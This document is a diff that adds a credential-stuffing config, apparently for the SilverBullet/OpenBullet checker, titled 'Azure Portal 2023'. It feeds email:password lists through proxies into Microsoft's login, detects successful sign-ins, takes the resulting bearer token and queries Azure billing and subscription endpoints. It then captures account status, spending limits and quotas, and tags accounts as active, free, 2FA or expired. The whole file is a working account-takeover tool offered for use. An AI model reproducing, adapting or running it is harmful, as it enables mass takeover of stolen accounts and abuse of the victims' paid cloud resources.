@@ -1,0 +1,413 @@
+[SETTINGS]
+{
+  "Name": "Azure Portal 2023",
+  "SuggestedBots": 70,
+  "MaxCPM": 0,
+  "LastModified": "2023-01-20T22:57:08.4396473+01:00",
+  "AdditionalInfo": "",
+  "RequiredPlugins": [],
+  "Author": "@koussai_001",
+  "Version": "1.1.2 [SB]",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "SaveHitsToTextFile": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "MailPass",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "IsBase64": false,
+  "FilterList": [],
+  "EvaluateMathOCR": false,
+  "SecurityProtocol": 0,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "AcceptInsecureCertificates": true,
+  "DisableNotifications": false,
+  "DisableImageLoading": false,
+  "DefaultProfileDirectory": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": "",
+  "Title": "Azure Portal 2023",
+  "IconPath": "Icon\\svbfile.ico",
+  "LicenseSource": null,
+  "Message": null,
+  "MessageColor": "#FFFFFFFF",
+  "HitInfoFormat": "[{hit.Type}][{hit.Proxy}] {hit.Data} - [{hit.CapturedString}]",
+  "AuthorColor": "#FFFFB266",
+  "WordlistColor": "#FFB5C2E1",
+  "BotsColor": "#FFA8FFFF",
+  "CustomInputColor": "#FFD6C7C7",
+  "CPMColor": "#FFFFFFFF",
+  "ProgressColor": "#FFAD93E3",
+  "HitsColor": "#FF66FF66",
+  "CustomColor": "#FFFFB266",
+  "ToCheckColor": "#FF7FFFD4",
+  "FailsColor": "#FFFF3333",
+  "RetriesColor": "#FFFFFF99",
+  "OcrRateColor": "#FF4698FD",
+  "ProxiesColor": "#FFFFFFFF"
+}
+
+[SCRIPT]
+#signin REQUEST GET "https://portal.azure.com/signin/idpRedirect.js/?sessionId=451cac0f1e704289880c0eb54d7ab5f2&feature.argsubscriptions=true&feature.showservicehealthalerts=true&feature.prefetchtokens=true&idpc=0" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+PARSE "<SOURCE>" LR "\"https://login." "\")" -> VAR "ACTIF" "https://login." "" 
+
+#ACTIF REQUEST GET "<ACTIF>" 
+  
+  HEADER "Host: login.microsoftonline.com" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8" 
+  HEADER "Accept-Language: en-US,en;q=0.5" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "DNT: 1" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+
+#sessionId PARSE "<SOURCE>" LR "\"sessionId\":\"" "\"" -> VAR "sessionId" 
+
+#sCtx PARSE "<SOURCE>" LR ":\"code\",\"sCtx\":\"" "\",\"" -> VAR "sCtx" 
+
+#FlowToken PARSE "<SOURCE>" LR "sPOST_Username\":\"\",\"sFT\":\"" "\",\"" -> VAR "flowToken" 
+
+#request PARSE "<SOURCE>" LR "u0026client-request-id=" "\\u0026" -> VAR "request" 
+
+FUNCTION URLEncode "<USER>" -> VAR "U" 
+
+FUNCTION URLEncode "<PASS>" -> VAR "P" 
+
+#Login_user_data REQUEST POST "https://login.microsoftonline.com/common/login" 
+  CONTENT "i13=0&login=<U>&loginfmt=<U>&type=11&LoginOptions=3&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd=<P>&ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=sOKAZug2qnOSP9X0HAnkNWGCfB3pwp1vAifDlMhrdzA%3D7%3A1&ctx=<sCtx>&hpgrequestid=<sessionId>&flowToken=<flowToken>&PPSX=&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=1&isSignupPost=0&i2=1&i17=&i18=&i19=176849" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Host: login.microsoftonline.com" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8" 
+  HEADER "Accept-Language: en-US,en;q=0.5" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Referer: https://login.microsoftonline.com/common/login" 
+  HEADER "Content-Type: application/x-www-form-urlencoded" 
+  HEADER "Content-Length: 1666" 
+  HEADER "Origin: https://login.microsoftonline.com" 
+  HEADER "DNT: 1" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+
+#User_checking KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "Your account or password is incorrect" 
+    KEY "passwordreset.microsoftonline.com" 
+    KEY "No tenant-identifying information found in either the request or implied by any provided credentials." 
+    KEY "Your email or password is incorrect. If you don\\'t remember your password" 
+    KEY "ad><title>Working...</title></" 
+    KEY "More information required" 
+    KEY "title>Redirecting...</title>" 
+  KEYCHAIN Success OR 
+    KEY "Your sign-in was successful but" 
+    KEY "Stay signed in?" 
+  KEYCHAIN Failure OR 
+    KEY "Enter code" 
+
+#sCtx PARSE "<SOURCE>" LR "\"flowToken\",\"sCtx\":\"" "\"" -> VAR "sCtx" 
+
+#sessionId PARSE "<SOURCE>" LR ",\"sessionId\":\"" "\",\"locale" -> VAR "sessionId" 
+
+#sFT PARSE "<SOURCE>" LR "\",\"sFT\":\"" "\",\"" -> VAR "sFT" 
+
+#canary PARSE "<SOURCE>" LR "\"canary\":\"" "\",\"" -> VAR "canary" 
+
+FUNCTION URLEncode "<canary>" -> VAR "canary" 
+
+#Logiin1 REQUEST POST "https://login.microsoftonline.com/kmsi" 
+  CONTENT "LoginOptions=3&type=28&ctx=<sCtx>&hpgrequestid=<sessionId>&flowToken=<sFT>&canary=<canary>&i2=&i17=&i18=&i19=1723" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Host: login.microsoftonline.com" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8" 
+  HEADER "Accept-Language: en-US,en;q=0.5" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Referer: https://login.microsoftonline.com/common/login" 
+  HEADER "Content-Type: application/x-www-form-urlencoded" 
+  HEADER "Content-Length: 2016" 
+  HEADER "Origin: https://login.microsoftonline.com" 
+
+#code PARSE "<SOURCE>" LR "ame=\"code\" value=\"" "\" /><inpu" -> VAR "code" 
+
+#token PARSE "<SOURCE>" LR "\"id_token\" value=\"" "\"" -> VAR "token" 
+
+#state PARSE "<SOURCE>" LR " name=\"state\" value=\"OpenIdConnect.AuthenticationProperties=" "\"" -> VAR "state" 
+
+#session PARSE "<SOURCE>" LR "name=\"session_state\" value=\"" "\"" -> VAR "session" 
+
+#portal REQUEST POST "https://portal.azure.com/signin/index/" 
+  CONTENT "code=<code>&id_token=<token>&state=OpenIdConnect.AuthenticationProperties%3D<state>&session_state=<session>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0" 
+  HEADER "accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8" 
+  HEADER "accept-language: en-US,en;q=0.5" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "referer: https://login.microsoftonline.com/" 
+  HEADER "content-type: application/x-www-form-urlencoded" 
+  HEADER "content-length: 3119" 
+  HEADER "origin: https://login.microsoftonline.com" 
+  HEADER "dnt: 1" 
+  HEADER "upgrade-insecure-requests: 1" 
+  HEADER "te: trailers" 
+
+#oAuthToken PARSE "<SOURCE>" LR "{\"oAuthToken\":{\"authHeader\":\"Bearer" "\",\"" -> VAR "oAuthToken" 
+
+#GetLazyUserData REQUEST GET "https://management.azure.com/providers/Microsoft.Billing/billingAccounts?$expand=address&api-version=2019-10-01-preview" 
+  
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0" 
+  HEADER "accept: application/json" 
+  HEADER "accept-language: en" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "content-type: application/json" 
+  HEADER "authorization: Bearer <oAuthToken>" 
+  HEADER "x-ms-effective-locale: en.en-us" 
+  HEADER "x-ms-client-request-id: 4d7f0101-0c4b-4d64-a308-c33837c85000" 
+  HEADER "x-ms-client-session-id: 451cac0f1e704289880c0eb54d7ab5f2" 
+  HEADER "x-ms-version: 7.179.0.5 (production#e8107cdee9.210319-1921) Signed" 
+  HEADER "x-ms-extension-flags: {\"feature.advisornotificationdays\":\"30\",\"feature.advisornotificationpercent\":\"100\",\"feature.allserviceswithoverview\":\"true\",\"feature.argsharedqueries\":\"true\",\"feature.argsubscriptions\":\"true\",\"feature.asyncsearch\":\"true\",\"feature.azureconsole\":\"true\",\"feature.azurehome\":\"true\",\"feature.contactinfo\":\"true\",\"feature.dashboardautorefresh\":\"true\",\"feature.dashboardfeedback\":\"true\",\"feature.dashboardnewpinexperience\":\"true\",\"feature.dashboardrefresh\":\"true\",\"feature.dkds\":\"true\",\"feature.enableregionmove\":\"true\",\"feature.essentialscostinmenuview\":\"true\",\"feature.essentialsjsonview\":\"true\",\"feature.freelancer\":\"true\",\"feature.guidedtour\":\"true\",\"feature.helpcontentwhatsnewenabled\":\"true\",\"feature.hidefavoritestars\":\"true\",\"feature.internalonly\":\"false\",\"feature.irissurfacename\":\"88000328\",\"feature.landalltohome\":\"true\",\"feature.meazblade\":\"true\",\"feature.mereactblade\":\"true\",\"feature.nojqueryeval\":\"true\",\"feature.npsintervaldays\":\"90\",\"feature.npspercent\":\"3.0\",\"feature.npsshowportaluri\":\"true\",\"feature.rgsecuritymenu\":\"true\",\"feature.sessionvalidity\":\"true\",\"feature.shadowargcall\":\"true\",\"feature.sharetomobile\":\"true\",\"feature.showhovercard\":\"true\",\"feature.sidebarhamburgermode\":\"true\",\"feature.subscreditcheck\":\"true\",\"feature.tilegallerycuration\":\"true\",\"feature.upgradefromtrialbutton\":\"true\",\"feature.usedkdsencryptedrt\":\"true\",\"hubsextension_argbrowseoptions\":\"{\\\"ARGSharedQueries\\\": \\\"force\\\",\\\"ResourceGroups\\\": \\\"force\\\",\\\"Dashboards\\\":\\\"force\\\"}\",\"hubsextension_argbrowsevmmaintenancebuttons\":\"true\",\"hubsextension_showpolicyhub\":\"true\",\"feature.allservicesweave\":\"true\",\"feature.argbrowsemgscope\":\"true\",\"feature.argbrowseviews\":\"true\",\"feature.argforoldbrowse\":\"true\",\"feature.argforrgoverview\":\"true\",\"feature.argtagsfilter\":\"true\",\"feature.artbrowse\":\"true\",\"feature.automationtasks\":\"true\",\"feature.browsecuration\":\"default\",\"feature.browsefilterstelemetry\":\"true\",\"feature.bypasstokencacheforcustomsignin\":\"true\",\"feature.cloudsimplereservations\":\"true\",\"feature.contactabilitybycountry\":\"true\",\"feature.dashboardfilters\":\"true\",\"feature.dashboardfiltersaddbutton\":\"true\",\"feature.dashboardpreviewapi\":\"false\",\"feature.devnps\":\"true\",\"feature.devnpsintervaldays\":\"45\",\"feature.devnpspercent\":\"50.0\",\"feature.enableaeoemails\":\"false\",\"feature.disableuntrustedcontentinjection\":\"false\",\"feature.displaypreferredusername\":\"true\",\"feature.enablee2emonitoring\":\"true\",\"feature.enablelocationchange\":\"true\",\"feature.experimentation\":\"true\",\"feature.failajaxonnulltoken\":\"true\",\"feature.fastencode\":\"true\",\"feature.feedback\":\"true\",\"feature.feedbackwithsupport\":\"true\",\"feature.fullscreenblades\":\"true\",\"feature.helpblade\":\"\",\"feature.hidemodalsonsmallscreens\":\"true\",\"feature.hidemodalswhendeeplinked\":\"true\",\"feature.iedeprecatedbanner\":\"true\",\"feature.iris\":\"true\",\"feature.irisalt\":\"true\",\"feature.irismessagelimit\":\"1\",\"feature.isworkbooksavailable\":\"true\",\"feature.logouttimerpopup\":\"true\",\"feature.microsoftportalrp\":\"true\",\"feature.migratetomsal\":\"true\",\"feature.mistendpoint\":\"https://mist.monitor.azure.com\",\"feature.mspexpert\":\"true\",\"feature.mspfilter\":\"true\",\"feature.mspinfo\":\"true\",\"feature.newresourceapi\":\"true\",\"feature.newsupportblade\":\"true\",\"feature.nps\":\"true\",\"feature.outagebanner\":\"true\",\"feature.paralleltokens\":\"true\",\"feature.portalpolling\":\"true\",\"feature.preact\":\"true\",\"feature.preferredusername\":\"true\",\"feature.prefetchdrafttoken\":\"true\",\"feature.prefetchrecents\":\"true\",\"feature.providers2019\":\"true\",\"feature.proxyirisbeaconcalls\":\"true\",\"feature.pushtokens\":\"true\",\"feature.reloadafterdays\":\"30\",\"feature.removesubsdropdownlimit\":\"true\",\"feature.reservationsinbrowse\":\"true\",\"feature.reservehozscroll\":\"true\",\"feature.resourcehealth\":\"true\",\"feature.savedeploymentnotification\":\"true\",\"feature.seetemplate\":\"true\",\"feature.serveravatar\":\"true\",\"feature.shellworker\":\"true\",\"feature.shellworkerassets\":\"true\",\"feature.shellworkerbrowseprereqs\":\"true\",\"feature.shellworkerlocations\":\"true\",\"feature.shellworkersubs\":\"true\",\"feature.shellworkeruser\":\"true\",\"feature.showcontactabilitymodal\":\"true\",\"feature.showpostcreatefeedbackoption\":\"true\",\"feature.showservicehealthalerts\":\"true\",\"feature.supplementalbatchsize\":\"20\",\"feature.tenantscoperedirect\":\"true\",\"feature.tokencaching\":\"true\",\"feature.usealertsv2blade\":\"true\",\"feature.usefeedbackinnotifications\":\"true\",\"feature.usemsallogin\":\"true\",\"feature.zerosubsexperience\":\"true\",\"hubsextension_argbrowseextviz\":\"true\",\"hubsextension_argbrowseviz\":\"true\",\"hubsextension_argtags\":\"true\",\"hubsextension_asyncexporttemplate\":\"true\",\"hubsextension_azureexpert\":\"true\",\"hubsextension_budgets\":\"true\",\"hubsextension_bulkdeletedeployments\":\"true\",\"hubsextension_costalerts\":\"true\",\"hubsextension_costanalysis\":\"true\",\"hubsextension_costrecommendations\":\"true\",\"hubsextension_eventgrid\":\"true\",\"hubsextension_islogsbladeavailable\":\"true\",\"hubsextension_isomsextensionavailable\":\"true\",\"hubsextension_nosubsdescriptionkey\":\"default\",\"hubsextension_regionsegments\":\"true\",\"hubsextension_resourcetagsapiforrgs\":\"true\",\"hubsextension_savetotemplatehub\":\"true\",\"hubsextension_showafec\":\"true\",\"microsoft_azure_marketplace_itemhidekey\":\"cuidCustomDeployment\"}" 
+  HEADER "x-requested-with: XMLHttpRequest" 
+  HEADER "content-length: 24" 
+  HEADER "origin: https://portal.azure.com" 
+  HEADER "dnt: 1" 
+  HEADER "referer: https://portal.azure.com" 
+
+#accountStatus PARSE "<SOURCE>" JSON "accountStatus" CreateEmpty=FALSE -> CAP "accountStatus" 
+
+#Final_Check KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "\"accountStatus\":\"Active\",\"" 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "{\"value\":[]}" 
+
+#GetLazyUserData REQUEST POST "https://portal.azure.com/api/Portal/GetLazyUserData" 
+  CONTENT "{\"version\":\"2019-10-01\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0" 
+  HEADER "accept: application/json" 
+  HEADER "accept-language: en" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "content-type: application/json" 
+  HEADER "authorization: Bearer <oAuthToken>" 
+  HEADER "x-ms-effective-locale: en.en-us" 
+  HEADER "x-ms-client-request-id: 4d7f0101-0c4b-4d64-a308-c33837c85000" 
+  HEADER "x-ms-client-session-id: 451cac0f1e704289880c0eb54d7ab5f2" 
+  HEADER "x-ms-version: 7.179.0.5 (production#e8107cdee9.210319-1921) Signed" 
+  HEADER "x-ms-extension-flags: {\"feature.advisornotificationdays\":\"30\",\"feature.advisornotificationpercent\":\"100\",\"feature.allserviceswithoverview\":\"true\",\"feature.argsharedqueries\":\"true\",\"feature.argsubscriptions\":\"true\",\"feature.asyncsearch\":\"true\",\"feature.azureconsole\":\"true\",\"feature.azurehome\":\"true\",\"feature.contactinfo\":\"true\",\"feature.dashboardautorefresh\":\"true\",\"feature.dashboardfeedback\":\"true\",\"feature.dashboardnewpinexperience\":\"true\",\"feature.dashboardrefresh\":\"true\",\"feature.dkds\":\"true\",\"feature.enableregionmove\":\"true\",\"feature.essentialscostinmenuview\":\"true\",\"feature.essentialsjsonview\":\"true\",\"feature.freelancer\":\"true\",\"feature.guidedtour\":\"true\",\"feature.helpcontentwhatsnewenabled\":\"true\",\"feature.hidefavoritestars\":\"true\",\"feature.internalonly\":\"false\",\"feature.irissurfacename\":\"88000328\",\"feature.landalltohome\":\"true\",\"feature.meazblade\":\"true\",\"feature.mereactblade\":\"true\",\"feature.nojqueryeval\":\"true\",\"feature.npsintervaldays\":\"90\",\"feature.npspercent\":\"3.0\",\"feature.npsshowportaluri\":\"true\",\"feature.rgsecuritymenu\":\"true\",\"feature.sessionvalidity\":\"true\",\"feature.shadowargcall\":\"true\",\"feature.sharetomobile\":\"true\",\"feature.showhovercard\":\"true\",\"feature.sidebarhamburgermode\":\"true\",\"feature.subscreditcheck\":\"true\",\"feature.tilegallerycuration\":\"true\",\"feature.upgradefromtrialbutton\":\"true\",\"feature.usedkdsencryptedrt\":\"true\",\"hubsextension_argbrowseoptions\":\"{\\\"ARGSharedQueries\\\": \\\"force\\\",\\\"ResourceGroups\\\": \\\"force\\\",\\\"Dashboards\\\":\\\"force\\\"}\",\"hubsextension_argbrowsevmmaintenancebuttons\":\"true\",\"hubsextension_showpolicyhub\":\"true\",\"feature.allservicesweave\":\"true\",\"feature.argbrowsemgscope\":\"true\",\"feature.argbrowseviews\":\"true\",\"feature.argforoldbrowse\":\"true\",\"feature.argforrgoverview\":\"true\",\"feature.argtagsfilter\":\"true\",\"feature.artbrowse\":\"true\",\"feature.automationtasks\":\"true\",\"feature.browsecuration\":\"default\",\"feature.browsefilterstelemetry\":\"true\",\"feature.bypasstokencacheforcustomsignin\":\"true\",\"feature.cloudsimplereservations\":\"true\",\"feature.contactabilitybycountry\":\"true\",\"feature.dashboardfilters\":\"true\",\"feature.dashboardfiltersaddbutton\":\"true\",\"feature.dashboardpreviewapi\":\"false\",\"feature.devnps\":\"true\",\"feature.devnpsintervaldays\":\"45\",\"feature.devnpspercent\":\"50.0\",\"feature.enableaeoemails\":\"false\",\"feature.disableuntrustedcontentinjection\":\"false\",\"feature.displaypreferredusername\":\"true\",\"feature.enablee2emonitoring\":\"true\",\"feature.enablelocationchange\":\"true\",\"feature.experimentation\":\"true\",\"feature.failajaxonnulltoken\":\"true\",\"feature.fastencode\":\"true\",\"feature.feedback\":\"true\",\"feature.feedbackwithsupport\":\"true\",\"feature.fullscreenblades\":\"true\",\"feature.helpblade\":\"\",\"feature.hidemodalsonsmallscreens\":\"true\",\"feature.hidemodalswhendeeplinked\":\"true\",\"feature.iedeprecatedbanner\":\"true\",\"feature.iris\":\"true\",\"feature.irisalt\":\"true\",\"feature.irismessagelimit\":\"1\",\"feature.isworkbooksavailable\":\"true\",\"feature.logouttimerpopup\":\"true\",\"feature.microsoftportalrp\":\"true\",\"feature.migratetomsal\":\"true\",\"feature.mistendpoint\":\"https://mist.monitor.azure.com\",\"feature.mspexpert\":\"true\",\"feature.mspfilter\":\"true\",\"feature.mspinfo\":\"true\",\"feature.newresourceapi\":\"true\",\"feature.newsupportblade\":\"true\",\"feature.nps\":\"true\",\"feature.outagebanner\":\"true\",\"feature.paralleltokens\":\"true\",\"feature.portalpolling\":\"true\",\"feature.preact\":\"true\",\"feature.preferredusername\":\"true\",\"feature.prefetchdrafttoken\":\"true\",\"feature.prefetchrecents\":\"true\",\"feature.providers2019\":\"true\",\"feature.proxyirisbeaconcalls\":\"true\",\"feature.pushtokens\":\"true\",\"feature.reloadafterdays\":\"30\",\"feature.removesubsdropdownlimit\":\"true\",\"feature.reservationsinbrowse\":\"true\",\"feature.reservehozscroll\":\"true\",\"feature.resourcehealth\":\"true\",\"feature.savedeploymentnotification\":\"true\",\"feature.seetemplate\":\"true\",\"feature.serveravatar\":\"true\",\"feature.shellworker\":\"true\",\"feature.shellworkerassets\":\"true\",\"feature.shellworkerbrowseprereqs\":\"true\",\"feature.shellworkerlocations\":\"true\",\"feature.shellworkersubs\":\"true\",\"feature.shellworkeruser\":\"true\",\"feature.showcontactabilitymodal\":\"true\",\"feature.showpostcreatefeedbackoption\":\"true\",\"feature.showservicehealthalerts\":\"true\",\"feature.supplementalbatchsize\":\"20\",\"feature.tenantscoperedirect\":\"true\",\"feature.tokencaching\":\"true\",\"feature.usealertsv2blade\":\"true\",\"feature.usefeedbackinnotifications\":\"true\",\"feature.usemsallogin\":\"true\",\"feature.zerosubsexperience\":\"true\",\"hubsextension_argbrowseextviz\":\"true\",\"hubsextension_argbrowseviz\":\"true\",\"hubsextension_argtags\":\"true\",\"hubsextension_asyncexporttemplate\":\"true\",\"hubsextension_azureexpert\":\"true\",\"hubsextension_budgets\":\"true\",\"hubsextension_bulkdeletedeployments\":\"true\",\"hubsextension_costalerts\":\"true\",\"hubsextension_costanalysis\":\"true\",\"hubsextension_costrecommendations\":\"true\",\"hubsextension_eventgrid\":\"true\",\"hubsextension_islogsbladeavailable\":\"true\",\"hubsextension_isomsextensionavailable\":\"true\",\"hubsextension_nosubsdescriptionkey\":\"default\",\"hubsextension_regionsegments\":\"true\",\"hubsextension_resourcetagsapiforrgs\":\"true\",\"hubsextension_savetotemplatehub\":\"true\",\"hubsextension_showafec\":\"true\",\"microsoft_azure_marketplace_itemhidekey\":\"cuidCustomDeployment\"}" 
+  HEADER "x-requested-with: XMLHttpRequest" 
+  HEADER "content-length: 24" 
+  HEADER "origin: https://portal.azure.com" 
+  HEADER "dnt: 1" 
+  HEADER "referer: https://portal.azure.com" 
+
+#displayName PARSE "<SOURCE>" LR ",\"displayName\":\"" "\",\"sta" CreateEmpty=FALSE -> CAP "displayName" 
+
+#state PARSE "<SOURCE>" LR "state\":\"" "\"" CreateEmpty=FALSE -> CAP "state" 
+
+#id PARSE "<SOURCE>" JSON "subscriptionId" -> VAR "id" 
+
+#resourceType PARSE "<SOURCE>" LR ",\"resourceType\":\"" "\",\"resourceKind\":" CreateEmpty=FALSE -> CAP "resourceType" 
+
+#status PARSE "<SOURCE>" LR ",\"status\":\"" "\"},\"" CreateEmpty=FALSE -> CAP "status" 
+
+#serviceHealthAlerts PARSE "<SOURCE>" JSON "serviceHealthAlerts" CreateEmpty=FALSE -> CAP "serviceHealthAlerts" 
+
+FUNCTION UnixTimeToISO8601 "<time>" -> CAP "TIME" 
+
+#Final_Check KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "<state>" Contains "Enabled" 
+    KEY "subscriptionId" 
+  KEYCHAIN Success OR 
+    KEY "<state>" Contains "Warned" 
+  KEYCHAIN Failure OR 
+    KEY "<SOURCE>" DoesNotContain "subscriptionId" 
+  KEYCHAIN Custom "2FACTOR" OR 
+    KEY "<state>" Contains "Disabled" 
+
+#subscriptions REQUEST GET "https://management.azure.com/subscriptions/<id>?api-version=2018-02-01" 
+  
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko/20100101 Firefox/88.0" 
+  HEADER "accept: */*" 
+  HEADER "accept-language: en" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "content-type: application/json" 
+  HEADER "authorization: Bearer <oAuthToken>" 
+  HEADER "x-ms-command-name: Microsoft_Azure_Billing." 
+  HEADER "x-ms-effective-locale: en.en-us" 
+  HEADER "x-ms-client-request-id: 7c55f7e1-56b5-4542-8cd1-fce01d609000" 
+  HEADER "x-ms-client-session-id: 3e78d4c232624705899fde73e970e296" 
+  HEADER "origin: https://portal.azure.com" 
+  HEADER "dnt: 1" 
+  HEADER "referer: https://portal.azure.com/" 
+  HEADER "te: trailers" 
+
+#subscriptions REQUEST GET "https://management.azure.com/subscriptions/<id>?api-version=2018-02-01" 
+  
+  HEADER "Accept: */*" 
+  HEADER "Accept-Language: en" 
+  HEADER "Authorization: Bearer <oAuthToken>" 
+  HEADER "Content-Type: application/json" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 OPR/76.0.4017.107" 
+  HEADER "x-ms-client-request-id: <request>" 
+  HEADER "x-ms-client-session-id: <sessionId>" 
+  HEADER "x-ms-command-name: Microsoft_Azure_Billing." 
+  HEADER "x-ms-effective-locale: en.en-us" 
+
+#spendingLimit PARSE "<SOURCE>" JSON "spendingLimit" CreateEmpty=FALSE -> CAP "suspend" 
+
+#provisioningState PARSE "<SOURCE>" LR "provisioningState\":\"" "\"" CreateEmpty=FALSE -> CAP "provisioningState" 
+
+#quotaId PARSE "<SOURCE>" JSON "quotaId" CreateEmpty=FALSE -> CAP "quotaId" 
+
+#state PARSE "<SOURCE>" JSON "state" -> VAR "state" 
+
+KEYCHECK 
+  KEYCHAIN Custom "EXPIRED" OR 
+    KEY "<state>" Contains "Disabled" 
+  KEYCHAIN Success OR 
+    KEY "<state>" Contains "Enabled" 
+
+FUNCTION ClearCookies 
+
+#ADD1 REQUEST GET "https://www.microsoftazuresponsorships.com/Balance" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#ADDRESS2 PARSE "<ADDRESS>" LR "" "" -> VAR "ADDRESS2" 
+
+#ADDRESS2 FUNCTION Replace " " "%20" "<ADDRESS2>" -> VAR "ADDRESS2" 
+
+#ADDRESS2 REQUEST GET "<ADDRESS2>" 
+  
+  HEADER "Host: login.microsoftonline.com" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8" 
+  HEADER "Accept-Language: en-US,en;q=0.5" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "DNT: 1" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+
+#sessionId PARSE "<SOURCE>" LR "\"sessionId\":\"" "\",\"" -> VAR "sessionId" 
+
+#sCtx PARSE "<SOURCE>" LR "\"code\",\"sCtx\":\"" "\",\"" -> VAR "sCtx" 
+
+#flowToken PARSE "<SOURCE>" LR "sPOST_Username\":\"\",\"sFT\":\"" "\",\"" -> VAR "flowToken" 
+
+FUNCTION URLEncode "<USER>" -> VAR "USER2" 
+
+FUNCTION URLEncode "<PASS>" -> VAR "PASS2" 
+
+REQUEST POST "https://login.microsoftonline.com/common/login" 
+  CONTENT "i13=0&login=<USER2>&loginfmt=<USER2>&type=11&LoginOptions=3&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd=<PASS2>&ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=sOKAZug2qnOSP9X0HAnkNWGCfB3pwp1vAifDlMhrdzA%3D7%3A1&ctx=<sCtx>&hpgrequestid=<sessionId>&flowToken=<flowToken>&PPSX=&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=1&isSignupPost=0&i2=1&i17=&i18=&i19=176849" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Host: login.microsoftonline.com" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8" 
+  HEADER "Accept-Language: en-US,en;q=0.5" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Referer: https://login.microsoftonline.com/common/login" 
+  HEADER "Content-Type: application/x-www-form-urlencoded" 
+  HEADER "Content-Length: 1666" 
+  HEADER "Origin: https://login.microsoftonline.com" 
+  HEADER "DNT: 1" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "Stay signed in?" 
+    KEY "Your sign-in was successful but" 
+  KEYCHAIN Failure OR 
+    KEY "passwordreset.microsoftonline.com" 
